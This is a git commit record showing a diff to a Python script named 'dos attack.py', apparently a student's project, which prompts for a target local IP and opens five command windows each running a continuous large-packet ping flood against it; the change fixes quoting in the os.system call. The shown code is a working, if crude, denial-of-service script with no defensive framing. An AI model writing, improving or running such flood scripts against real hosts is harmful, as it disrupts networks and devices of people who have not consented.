f15e34d70087685eaf44eccb2b16f6aaa5753c2f
xcheif <xabi.felix@glc.vic.edu.au>
2025-05-13 12:29:18 +1000

    Update dos attack.py

--- dos attack.py
+++ dos attack.py
@@ -4,7 +4,7 @@ ip = input('enter the target local ip')
 command = 'ping {ip} -t -l 65500'
 cmd = command.replace('{ip}',ip)
 for i in range(5):
-    os.system(f'start cmd /k '{cmd})
+    os.system(f"start cmd /k {cmd}")
     time.sleep(0.2)
     
     
